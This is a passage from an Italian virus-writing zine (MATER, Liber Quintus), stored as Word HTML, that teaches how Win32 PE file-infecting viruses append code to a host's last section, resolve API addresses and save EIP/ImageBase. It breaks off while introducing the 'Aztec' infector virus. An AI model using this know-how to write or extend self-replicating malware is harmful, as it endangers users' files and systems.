<html xmlns:v="urn:schemas-microsoft-com:vml"
xmlns:o="urn:schemas-microsoft-com:office:office"
xmlns:w="urn:schemas-microsoft-com:office:word"
xmlns="http://www.w3.org/TR/REC-html40">

<head>
<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
<meta name=ProgId content=Word.Document>
<meta name=Generator content="Microsoft Word 9">
<meta name=Originator content="Microsoft Word 9">
<link rel=File-List href="./MATER_5_file/filelist.xml">
<title>La curatrice di questo documento non è responsabile in alcun modo del
danneggiamento di dati e sistemi che potrebbe derivare d</title>
<!--[if gte mso 9]><xml>
 <o:DocumentProperties>
  <o:Author>Administrator</o:Author>
  <o:LastAuthor>Administrator</o:LastAuthor>
  <o:Revision>5</o:Revision>
  <o:TotalTime>85</o:TotalTime>
  <o:LastPrinted>2000-11-23T14:26:00Z</o:LastPrinted>
  <o:Created>2000-12-06T15:24:00Z</o:Created>
  <o:LastSaved>2000-12-13T10:48:00Z</o:LastSaved>
  <o:Pages>24</o:Pages>
  <o:Words>12707</o:Words>
  <o:Characters>72435</o:Characters>
  <o:Lines>603</o:Lines>
  <o:Paragraphs>144</o:Paragraphs>
  <o:CharactersWithSpaces>88955</o:CharactersWithSpaces>
  <o:Version>9.2812</o:Version>
 </o:DocumentProperties>
</xml><![endif]--><!--[if gte mso 9]><xml>
 <w:WordDocument>
  <w:HyphenationZone>14</w:HyphenationZone>
  <w:DrawingGridHorizontalSpacing>6 pt</w:DrawingGridHorizontalSpacing>
  <w:DisplayHorizontalDrawingGridEvery>2</w:DisplayHorizontalDrawingGridEvery>
  <w:DisplayVerticalDrawingGridEvery>2</w:DisplayVerticalDrawingGridEvery>
  <w:Compatibility>
   <w:FootnoteLayoutLikeWW8/>
   <w:ShapeLayoutLikeWW8/>
   <w:AlignTablesRowByRow/>
   <w:ForgetLastTabAlignment/>
   <w:LayoutRawTableWidth/>
   <w:LayoutTableRowsApart/>
  </w:Compatibility>
 </w:WordDocument>
</xml><![endif]-->
<style>
<!--
 /* Font Definitions */
@font-face
	{font-family:"MS Mincho";
	panose-1:2 2 6 9 4 2 5 8 3 4;
	mso-font-alt:"\FF2D\FF33 \660E\671D";
	mso-font-charset:128;
	mso-generic-font-family:roman;
	mso-font-pitch:fixed;
	mso-font-signature:1 134676480 16 0 131072 0;}
@font-face
	{font-family:"Arial Unicode MS";
	panose-1:2 11 6 4 2 2 2 2 2 4;
	mso-font-charset:128;
	mso-generic-font-family:modern;
	mso-font-pitch:variable;
	mso-font-signature:-1 -369098753 63 0 4129023 0;}
@font-face
	{font-family:"\@Arial Unicode MS";
	mso-font-charset:128;
	mso-generic-font-family:modern;
	mso-font-pitch:variable;
	mso-font-signature:-1 -369098753 63 0 4129023 0;}
@font-face
	{font-family:"\@MS Mincho";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:128;
	mso-generic-font-family:roman;
	mso-font-format:other;
	mso-font-pitch:fixed;
	mso-font-signature:1 134676480 16 0 131072 0;}
 /* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
	{mso-style-parent:"";
	margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
h1
	{margin-right:0cm;
	mso-margin-top-alt:auto;
	mso-margin-bottom-alt:auto;
	margin-left:0cm;
	mso-pagination:widow-orphan;
	mso-outline-level:1;
	font-size:24.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";
	mso-font-kerning:18.0pt;
	font-weight:bold;}
h2
	{mso-style-next:Normale;
	margin:0cm;
	margin-bottom:.0001pt;
	text-align:justify;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:2;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";
	font-weight:bold;}
h3
	{mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:18.0pt;
	margin-bottom:.0001pt;
	text-align:center;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:3;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"MS Mincho";
	color:white;
	font-weight:bold;}
h5
	{mso-style-next:Normale;
	margin:0cm;
	margin-bottom:.0001pt;
	text-align:center;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:5;
	font-size:14.0pt;
	mso-bidi-font-size:12.0pt;
	font-family:Arial;
	mso-fareast-font-family:"Times New Roman";
	color:white;
	font-weight:bold;}
p.MsoHeading8, li.MsoHeading8, div.MsoHeading8
	{mso-style-next:Normale;
	margin:0cm;
	margin-bottom:.0001pt;
	text-align:center;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:8;
	font-size:18.0pt;
	mso-bidi-font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";
	color:#CCFFFF;}
p.MsoFooter, li.MsoFooter, div.MsoFooter
	{margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	tab-stops:center 240.95pt right 481.9pt;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
a:link, span.MsoHyperlink
	{color:blue;
	text-decoration:underline;
	text-underline:single;}
a:visited, span.MsoHyperlinkFollowed
	{color:purple;
	text-decoration:underline;
	text-underline:single;}
p.MsoPlainText, li.MsoPlainText, div.MsoPlainText
	{margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:10.0pt;
	font-family:"Courier New";
	mso-fareast-font-family:"Times New Roman";}
p
	{margin-right:0cm;
	mso-margin-top-alt:auto;
	mso-margin-bottom-alt:auto;
	margin-left:0cm;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Arial Unicode MS";}
pre
	{margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt;
	font-size:10.0pt;
	font-family:"Courier New";
	mso-fareast-font-family:"Courier New";}
@page Section1
	{size:595.3pt 841.9pt;
	margin:1.0cm 1.0cm 1.0cm 2.0cm;
	mso-header-margin:36.0pt;
	mso-footer-margin:36.0pt;
	mso-paper-source:0;}
div.Section1
	{page:Section1;}
 /* List Definitions */
@list l0
	{mso-list-id:1272274837;
	mso-list-type:hybrid;
	mso-list-template-ids:512896566 68157455 68157465 68157467 68157455 68157465 68157467 68157455 68157465 68157467;}
@list l1
	{mso-list-id:1486818573;
	mso-list-type:hybrid;
	mso-list-template-ids:-1611734682 -327886272 68157443 68157445 68157441 68157443 68157445 68157441 68157443 68157445;}
@list l1:level1
	{mso-level-number-format:bullet;
	mso-level-text:-;
	mso-level-tab-stop:26.5pt;
	mso-level-number-position:left;
	margin-left:25.5pt;
	text-indent:-17.0pt;
	font-family:"Times New Roman";}
@list l2
	{mso-list-id:1711416642;
	mso-list-type:hybrid;
	mso-list-template-ids:24773318 1229981848 -289498516 -1158130626 1736454454 1053598178 -463423900 -1960774916 991229938 -1643092536;}
@list l2:level2
	{mso-level-number-format:bullet;
	mso-level-text:-;
	mso-level-tab-stop:72.0pt;
	mso-level-number-position:left;
	margin-left:71.0pt;
	text-indent:-17.0pt;
	font-family:"Times New Roman";}
ol
	{margin-bottom:0cm;}
ul
	{margin-bottom:0cm;}
-->
</style>
<!--[if gte mso 9]><xml>
 <o:shapedefaults v:ext="edit" spidmax="1027">
  <o:colormru v:ext="edit" colors="#010181,#010178"/>
  <o:colormenu v:ext="edit" fillcolor="#010178"/>
 </o:shapedefaults></xml><![endif]--><!--[if gte mso 9]><xml>
 <o:shapelayout v:ext="edit">
  <o:idmap v:ext="edit" data="1"/>
 </o:shapelayout></xml><![endif]-->
</head>

<body bgcolor="#010178" lang=IT link=blue vlink=purple style='tab-interval:
35.4pt'>

<div class=Section1>

<p class=MsoPlainText align=center style='text-align:center'><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:red'>M</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:#CCFFFF'>inima </span></b><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:red'>A</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:#CCFFFF'>nonyma </span></b><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:red'>T</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:#CCFFFF'>abularia </span></b><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:red'>E</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:#CCFFFF'>x </span></b><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:red'>R</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:#CCFFFF'>eti<o:p></o:p></span></b></p>

<p class=MsoNormal align=center style='margin-left:18.0pt;text-align:center'><i><span
style='font-size:11.0pt;mso-bidi-font-size:12.0pt;mso-fareast-font-family:"MS Mincho";
color:#99CCFF'>nihil vacuum neque sine signo apud </span></i><i><span
style='font-size:11.0pt;mso-bidi-font-size:12.0pt;mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>MATER</span></i><i><span style='font-size:11.0pt;mso-bidi-font-size:
12.0pt;mso-fareast-font-family:"MS Mincho";color:#99CCFF'><o:p></o:p></span></i></p>

<h3><a name="_Ref500557024">Liber Quintus</a></h3>

<p class=MsoNormal align=center style='margin-left:18.0pt;text-align:center'><i><span
style='mso-fareast-font-family:"MS Mincho";color:white'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></i></p>

<p class=MsoNormal align=center style='margin-left:18.0pt;text-align:center'><i><span
style='mso-fareast-font-family:"MS Mincho";color:white'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></i></p>

<h2 style='margin-top:0cm;margin-right:42.0pt;margin-bottom:0cm;margin-left:
54.0pt;margin-bottom:.0001pt'><span style='font-size:9.0pt;mso-bidi-font-size:
12.0pt;font-family:Arial;color:white;font-weight:normal'>Salve, vera Pascalis
proles. <o:p></o:p></span></h2>

<h2 style='margin-top:0cm;margin-right:42.0pt;margin-bottom:0cm;margin-left:
54.0pt;margin-bottom:.0001pt'><span style='font-size:9.0pt;mso-bidi-font-size:
12.0pt;font-family:Arial;color:white;font-weight:normal'>Questa è la zine
ufficiale di Familia, un gruppo che ha come oggetto di studio la programmazione
virale.<o:p></o:p></span></h2>

<h2 style='margin-top:0cm;margin-right:42.0pt;margin-bottom:0cm;margin-left:
54.0pt;margin-bottom:.0001pt'><span style='font-size:9.0pt;mso-bidi-font-size:
12.0pt;font-family:Arial;color:white;font-weight:normal'>MATER ha come scopo
l’esame delle tecniche di programmazione virale e delle problematiche ad esse
associate. MATER è una raccolta di contributi volontari (e non) di alcuni
code-writers del pianeta, in lingua italiana ed è rivolta soprattutto a chi si
avvicina per la prima volta al mondo dei virus e necessita dei concetti di base
che spesso sono dati per scontati nelle zines reperibili in Rete. Non è,
tuttavia, una esemplificazione discorsiva priva di contenuto tecnico: per
comprendere gli esempi ivi contenuti è necessaria una minima conoscenza
dell’architettura di un elaboratore e del linguaggio assembler.<o:p></o:p></span></h2>

<h2 style='margin-top:0cm;margin-right:42.0pt;margin-bottom:0cm;margin-left:
54.0pt;margin-bottom:.0001pt'><span style='font-size:9.0pt;mso-bidi-font-size:
12.0pt;font-family:Arial;color:white;font-weight:normal'>E’ nostra convinzione
che una migliore conoscenza delle metodologie infettive digitali sia la
principale strada per accrescere la sicurezza degli utenti e fornire un
contributo a chi opera nel settore della programmazione. Ritenendo il vero
nemico della sicurezza la disinformazione, auspichiamo che una più profonda
comprensione in questo campo dissipi i dubbi, aiuti la ricerca e contribuisca
al progresso dell’educazione informatica. Sursum Corda !<span
style="mso-spacerun: yes">  </span><o:p></o:p></span></h2>

<p class=MsoNormal style='margin-top:0cm;margin-right:42.0pt;margin-bottom:
0cm;margin-left:54.0pt;margin-bottom:.0001pt'><span style='font-size:10.0pt;
mso-bidi-font-size:12.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='margin-top:0cm;margin-right:42.0pt;margin-bottom:
0cm;margin-left:54.0pt;margin-bottom:.0001pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>

<h5 style='margin-top:0cm;margin-right:42.0pt;margin-bottom:0cm;margin-left:
54.0pt;margin-bottom:.0001pt'><span style='font-size:16.0pt;mso-bidi-font-size:
12.0pt'>ATTENZIONE<o:p></o:p></span></h5>

<p class=MsoNormal style='margin-top:0cm;margin-right:42.0pt;margin-bottom:
0cm;margin-left:54.0pt;margin-bottom:.0001pt;text-align:justify'><span
style='font-family:Arial;color:white'>Questa pubblicazione contiene
informazioni e codice sorgente relativi alla sicurezza informatica. </span><span
style='font-family:Arial;mso-fareast-font-family:"MS Mincho";color:white'>Lo
scopo di queste informazioni è di aiutare gli utenti ad accrescere la propria
capacità di programmazione. Questo materiale è a puro scopo didattico e non
include codice distruttivo né documenti attinenti ad alcuna attività illegale.
Si declina ogni responsabilità nel caso chiunque utilizzi le suddette
informazioni per creare, compilare e diffondere intenzionalmente programmi
diretti a danneggiare o interrompere un sistema informatico o telematico,
ovvero a provocarne l'interruzione, totale o parziale, o l'alterazione del suo
funzionamento <i>Art. 615-quinquies (Legge n. 547/93 pubblicata in Gazzetta Ufficiale
n. 305 del 30.12.1993)</i></span><span style='font-family:Arial'><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoHeading8><b><span style='color:silver'><span style="mso-spacerun:
yes"> </span>§ MATER</span></b><span style='color:silver'> Liber Quintus <b>§</b><o:p></o:p></span></p>

<h2><span style='font-size:14.0pt;mso-bidi-font-size:12.0pt;color:#CCFFFF;
font-weight:normal'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></h2>

<h2><span style='font-size:14.0pt;mso-bidi-font-size:12.0pt;color:#CCFFFF;
font-weight:normal'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></h2>

<h2><span style='font-size:14.0pt;mso-bidi-font-size:12.0pt;color:#CCFFFF;
font-weight:normal'>I VIRUS NELL’AMBIENTE DI WINDOWS 32<o:p></o:p></span></h2>

<p class=MsoNormal><span style='mso-fareast-font-family:"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
16.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";color:#FFCC00'>indice<o:p></o:p></span></b></p>

<h2 style='margin-left:36.0pt;text-indent:-18.0pt;mso-list:l0 level1 lfo2;
tab-stops:list 36.0pt'><![if !supportLists]><span style='color:#CCFFFF;
font-weight:normal'>1.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='color:#CCFFFF;font-weight:normal'><a
href="#_1._EXE_infettori"><span style='color:#CCFFFF'>EXE infettori di Windows</span></a><o:p></o:p></span></h2>

<ol style='margin-top:0cm' start=2 type=1>
 <li class=MsoNormal style='color:#CCFFFF;mso-list:l0 level1 lfo2;tab-stops:
     list 36.0pt'><a href="#_2._Un_Esempio"><span style='color:#CCFFFF'>Un
     esempio</span></a><o:p></o:p></li>
</ol>

<p class=MsoNormal><span style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<h1><a name="_1._EXE_infettori"></a><span style='font-size:14.0pt;mso-bidi-font-size:
24.0pt;mso-fareast-font-family:"MS Mincho";color:red;font-weight:normal'>1. EXE
infettori di Windows (PE<span style="mso-spacerun: yes">  </span>infettori)<o:p></o:p></span></h1>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">         </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFF5CD'><span style="mso-spacerun: yes">   </span>Un virus
infettore di windows segue le caratteristiche di un exe infettore di DOS, con
le differenze dovute principalmente alla diversa struttura, precedentemente
vista, del file PE. Esistono varie tecniche di inserimento del codice virale
nel programma ospite e a vari livelli. In questa sede tratteremo l’inserimento
di un virus attraverso l’ampliamento dell’ultima sezione del file ospitante
(un’altra tecnica consiste nell’aggiungere un’altra sezione) a livello utente
(Ring3).<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFF5CD'><span style="mso-spacerun: yes"> </span>Come sotto
DOS, anche qui abbiamo la modifica di alcuni campi dell’header del file
infettato, mentre le differenze principali rispetto ad un generico EXE
infettore di DOS consistono in:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFF5CD'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:25.5pt;text-align:justify;text-indent:
-17.0pt;mso-list:l1 level1 lfo5;tab-stops:list 26.5pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFF5CD'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#FFF5CD'>determinazione
degli indirizzi delle funzioni API utilizzate dal virus;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:25.5pt;text-align:justify;text-indent:
-17.0pt;mso-list:l1 level1 lfo5;tab-stops:list 26.5pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFF5CD'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#FFF5CD'>mappatura
del file da infettare in memoria;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:25.5pt;text-align:justify;text-indent:
-17.0pt;mso-list:l1 level1 lfo5;tab-stops:list 26.5pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFF5CD'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#FFF5CD'>allineamento
della somma virus + file host.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFF5CD'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFF5CD'>Come si può notare, la principale differenza
consiste nella manipolazione dei dati (qui intesi come file da infettare), i
quali non vengono più gestiti su disco ma mappati in memoria con la tecnica del
file mapping. Rammentiamo che tale tecnica consiste nel caricare (mappare) in
memoria il file, modificarlo e quindi demapparlo per “rilasciarlo” su disco. La
determinazione degli indirizzi delle API utilizzate dal codice virale non è
caratteristica necessaria, e in molti virus “dedicati” ad una sola piattaforma,
ad esempio Win95 o Win NT, tale routine può essere omessa semplicemente
“hard-codificando” tali indirizzi, cioè inserendo tali indirizzi come assoluti
e costanti.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFF5CD'><span style="mso-spacerun: yes"> </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#FFF5CD'>Un paio di
definizioni che ci torneranno utili:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#FFF5CD'>host-RAM:
programma caricato in RAM e già infettato;<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#FFF5CD'>host-disco:
programma su disco da infettare.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#FFF5CD'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#FFF5CD'>E’ necessario
considerare che il codice virale, che possiede la caratteristica di copiare sé
stesso in un altro file eseguibile, deve poter memorizzare al suo interno
alcune variabili necessarie al suo corretto funzionamento. Negli EXE infettori
sotto DOS tali variabili conservavano i primi n-bytes sostituiti
dall’istruzione JMP; in un Win32 infettore queste variabili sono l’EIP e
l’Image Base. Ogni virus “appeso” al suo file ospitante deve poter avere tali
informazioni per ritornare il controllo al suo HOST.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#FFF5CD'>Nel codice
virale, in prossimità della chiamata alla routine di infezione troveremo quindi
un costrutto simile:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#FFF5CD'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
9.0pt;mso-bidi-font-size:10.0pt;mso-fareast-font-family:"MS Mincho";color:#FFF5CD'>push
EIP, ImageBase<span style="mso-spacerun: yes">  </span>; salva le variabili<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
9.0pt;mso-bidi-font-size:10.0pt;mso-fareast-font-family:"MS Mincho";color:#FFF5CD'>call
infetta<span style="mso-spacerun: yes">         </span>; le variabili saranno
modificate per poi essere copiate nell’host-disco<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
9.0pt;mso-bidi-font-size:10.0pt;mso-fareast-font-family:"MS Mincho";color:#FFF5CD'>pop<span
style="mso-spacerun: yes">  </span>EIP,ImageBase<span style="mso-spacerun:
yes">   </span>; ripristina le variabili<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
9.0pt;mso-bidi-font-size:10.0pt;mso-fareast-font-family:"MS Mincho";color:#FFF5CD'>ret<span
style="mso-spacerun: yes">                  </span>; ritorna il controllo
all’host-disco<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
9.0pt;mso-bidi-font-size:10.0pt;mso-fareast-font-family:"MS Mincho";color:#FFF5CD'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#FFF5CD'>Come si vede, le
variabili necessarie per ritornare il controllo all’host-disco (il programma
che ospita il codice virale che sta girando) vengono prima salvate nello stack,
dato che durante il processo infettivo verranno modificate per poter essere
copiate nel codice virale inserito nell’host-disco (programma che il codice
virale sta infettando), e quindi ripristinate riprendendole dallo stack. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#FFF5CD'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<h1><a name="_2._Un_Esempio"></a><span style='font-size:14.0pt;mso-bidi-font-size:
24.0pt;mso-fareast-font-family:"MS Mincho";color:red;font-weight:normal'>2. Un
Esempio <o:p></o:p></span></h1>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'>Studieremo<span
style="mso-spacerun: yes">  </span>Aztec, un semplice virus ad azione diretta (runtime)
che può girare in tutte le piattaforme Win32 (ricava gli indirizzi delle API
che utilizza dinamicamente). Infetta 5 files nelle seguenti directory:
corrente, windows e system. Non contiene routines di stealth o di
crittografazione. Non contiene routines di payload.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'>Azioni eseguite
da virus:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo7;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
